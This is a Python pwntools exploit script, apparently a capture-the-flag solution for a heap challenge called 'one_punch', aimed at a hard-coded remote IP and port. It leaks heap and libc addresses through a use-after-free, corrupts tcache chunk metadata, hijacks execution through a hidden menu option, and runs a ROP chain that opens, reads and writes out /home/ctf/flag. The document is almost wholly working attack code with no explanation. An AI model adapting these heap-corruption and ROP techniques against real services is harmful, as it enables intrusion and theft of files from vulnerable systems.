from pwn import *

#r = process(["./one_punch"])
r = remote("52.198.120.1", 48763)
def add(idx,name):
    r.sendlineafter(">","1")
    r.sendlineafter(":",str(idx))
    r.sendafter(":",name)


def edit(idx,data):
    r.sendlineafter(">","2")
    r.sendlineafter(":",str(idx))
    r.sendafter(":",data)

def show(idx):
    r.sendlineafter(">","3")
    r.sendlineafter(":",str(idx))

def remove(idx):
    r.sendlineafter(">","4")
    r.sendlineafter(":",str(idx))

def punch(data):
    r.sendafter(">",str(0xC388).ljust(8,'\x00'))
    r.send(data)

for _ in range(7):
    add(0,"a"*0x80)
    remove(0)
show(0)
r.recvuntil(": ")
heap = u64(r.recvn(6)+"\x00\x00")-0x530
print hex(heap)
add(0,"a"*0x80)
add(1,"a"*0x80)
remove(0)
show(0)
r.recvuntil(": ")
libc = u64(r.recvn(6)+"\x00\x00")-0x1e4ca0
print hex(libc)
remove(1)
add(0,"a"*0x80)
add(1,"a"*0x80)
add(2,"a"*0x80)
remove(0)
remove(1)
remove(2)
add(0,"a"*0x1b0)
context.arch = "amd64"
edit(0,"\x00"*0x88+flat(0x21,[0]*3,0x71,[0]*13,0x31,[0]*5,0x61,[0]*11))
remove(1)
remove(2)
edit(0,"\x00"*0x88+flat(0x21,[0]*3,heap+0x40,[0]*13,0x31,[0]*2,heap+0x40))

for i in range(0xf840/0x400-2):
    add(0,"a"*0x400)

add(0,"a"*0x300)
add(0,"a"*0xd0)
add(0,"a"*0x80)
add(2,"a"*0x80)
remove(0)
remove(2)
add(0,"a"*0x300)
edit(0,"\x00"*0x80+flat(0x10000,0x90,[0]*17,0x21,[0]*3))

add(0,"a"*0x390)
remove(0)
add(0,"a"*0x390)
remove(0)
add(0,"a"*0x390)
remove(0)
add(0,"a"*0x3b0)


remove(0)
remove(2)
add(2,"a"*0x300)
edit(2,"\x00"*0x100+p64(0)+"\x00"*0x100)
for i in range(7):
    add(0,"a"*0x210)
    remove(0)
edit(2,"\x00"*0x100+p64(libc+0x1e4c30)+"\x00"*0x100+"/home/ctf/flag\x00")
punch(p64(libc+0x141e82))
data = range(0xc)
add(0,flat(data)+flat(
libc+0x26542,heap+0x258,libc+0x26f9e,0,libc+0x47cf8,2,libc+0x00cf6c5,
libc+0x26542,0x3,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,0,libc+0x00cf6c5,
libc+0x26542,0x1,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,1,libc+0x00cf6c5,
).ljust(0x200,"\x00"))

r.interactive()

